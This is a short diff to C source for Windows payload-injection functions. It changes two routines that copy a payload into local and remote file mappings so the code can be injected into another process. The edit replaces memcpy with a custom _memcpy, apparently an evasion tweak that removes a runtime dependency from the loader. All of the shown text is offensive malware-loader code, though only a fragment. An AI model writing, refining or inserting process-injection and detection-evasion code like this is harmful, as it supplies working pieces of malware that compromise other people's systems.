@@ -30,7 +30,7 @@ BOOL  WritePayloadViaLocalFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize,
 	DebugPrint("[i] pMapAddress : 0x%p \n", pMapAddress);
 
 	DebugPrint("[i] Copying Payload To 0x%p ...\n", pMapAddress);
-	memcpy(pMapAddress, pPayload, sPayloadSize);
+	_memcpy(pMapAddress, pPayload, sPayloadSize);
 	DebugPrint("[+] DONE \n");
 	
 	
@@ -79,7 +79,7 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	DebugPrint("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);
 
 	DebugPrint("\t[i] Copying Payload To 0x%p ...\n", pMapLocalAddress);
-	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
+	_memcpy(pMapLocalAddress, pPayload, sPayloadSize);
 	DebugPrint("[+] DONE \n");
 
 	// maps the payload to a new remote buffer (in the target process)
